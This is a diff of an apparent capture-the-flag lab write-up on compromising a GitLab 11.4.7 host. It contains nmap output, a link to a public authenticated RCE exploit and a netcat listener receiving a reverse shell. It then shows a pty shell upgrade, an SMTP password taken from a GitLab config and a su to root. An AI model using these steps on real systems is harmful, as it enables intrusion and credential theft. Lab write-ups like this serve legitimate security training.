@@ -1,3 +1,4 @@
+```
 PORT     STATE SERVICE VERSION
 22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
 | ssh-hostkey: 
@@ -13,23 +14,24 @@ PORT     STATE SERVICE VERSION
 | http-title: Sign in \xC2\xB7 GitLab
 |_Requested resource was http://10.129.227.132:5080/users/sign_in
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
-
+```
 gitlab on port 5080, with version of 11.4.7, after register an account, view the version
 
 https://github.com/mohinparamasivam/GitLab-11.4.7-Authenticated-Remote-Code-Execution/blob/main/gitlab_rce.py
-
+```
 └─$ nc -nvlp 443 
 listening on [any] 443 ...
 connect to [10.10.16.47] from (UNKNOWN) [10.129.227.132] 47914
 /bin/sh: 0: can't access tty; job control turned off
 $ python3 -c 'import pty;pty.spawn("/bin/bash")'
-
+```
 //get user
 
 //search in the gitlab dir, found a passwd, try to su to root
 gitlab_rails['smtp_password'] = "wW59U!ZKMbG9+*#h"
 
-``su 
+```
+su 
 root@gitlab:/# ls -la
 ls -la
 total 100
